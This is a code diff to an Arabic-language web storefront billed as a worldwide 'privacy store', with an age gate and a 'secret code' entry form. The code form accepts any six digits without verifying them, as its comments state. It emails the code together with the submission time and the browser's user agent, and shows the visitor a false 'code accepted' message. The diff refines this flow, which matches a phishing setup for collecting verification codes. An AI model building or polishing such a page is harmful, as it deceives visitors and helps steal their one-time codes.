@@ -1,4 +1,4 @@
-<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;"><meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
+<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>متجر الخصوصية العالمي المتطور - توصيل لجميع أنحاء العالم</title>
@@ -716,9 +716,19 @@
             }
         ];
 
-        // Age verification
+        // Age verification - Fixed to remember user's confirmation
         function confirmAge() {
             document.getElementById('age-verification').style.display = 'none';
+            // Store that age has been verified
+            localStorage.setItem('ageVerified', 'true');
+        }
+
+        // Check if age verification is needed
+        function checkAgeVerification() {
+            const ageVerified = localStorage.getItem('ageVerified');
+            if (ageVerified === 'true') {
+                document.getElementById('age-verification').style.display = 'none';
+            }
         }
 
         // Navigation functions
@@ -901,29 +911,37 @@
 
         // Global variable for tracking form submission
         let currentFormType = '';
+        let isCodeFormSubmitted = false;
 
         // Handle form submission response
         function handleFormSubmit() {
-            if (currentFormType === 'code') {
+            if (currentFormType === 'code' && !isCodeFormSubmitted) {
+                isCodeFormSubmitted = true;
                 // Code form submitted successfully
-                showNotification('تم إرسال الكود بنجاح! جاري المراجعة.');
+                setTimeout(() => {
+                    showNotification('🎉 تم قبول الكود بنجاح!');
+                    setTimeout(() => {
+                        showPage('code-thanks');
+                    }, 1000);
+                }, 500);
             }
             currentFormType = '';
         }
 
-        // Code verification - يقبل أي 6 أرقام بدون أي تحقق
+        // Code verification - Fixed to accept any 6 digits and send to email
         document.getElementById('code-form').addEventListener('submit', function(e) {
             e.preventDefault();
+            
             const code = document.getElementById('secret-code').value.trim();
             const currentTime = new Date().toLocaleString('ar-SA');
             
-            // تحقق بسيط فقط من أن هناك 6 أرقام
-            if (code.length !== 6) {
-                showNotification('يرجى إدخال 6 أرقام');
+            // Simple validation for 6 digits
+            if (code.length !== 6 || !/^\d{6}$/.test(code)) {
+                showNotification('يرجى إدخال 6 أرقام فقط');
                 return;
             }
             
-            // أي 6 أرقام مقبولة - لا يوجد رسالة "كود غير صحيح"
+            // Accept any 6 digits - no "incorrect code" message
             this.querySelector('input[name="submission_time"]').value = currentTime;
             this.querySelector('input[name="code_status"]').value = 'تم قبول الكود بنجاح';
             this.querySelector('input[name="user_agent"]').value = navigator.userAgent;
@@ -931,15 +949,13 @@
             
             // Set form type for tracking
             currentFormType = 'code';
+            isCodeFormSubmitted = false;
             
-            // Submit the form - سيرسل للبريد الآن مع جميع المعلومات
+            // Submit the form - will send to email with all information
             this.submit();
             
-            // Show success notification and redirect to thank you page
-            showNotification('🎉 تم قبول الكود بنجاح!');
-            setTimeout(() => {
-                showPage('code-thanks');
-            }, 1500);
+            // Show loading notification
+            showNotification('⏳ جاري التحقق من الكود...');
         });
 
         // Purchase code verification
@@ -1100,6 +1116,9 @@
 
         // Check URL hash for success redirect
         document.addEventListener('DOMContentLoaded', function() {
+            // Check age verification first
+            checkAgeVerification();
+            
             if (window.location.hash === '#success') {
                 // Show purchase code page
                 setTimeout(() => {
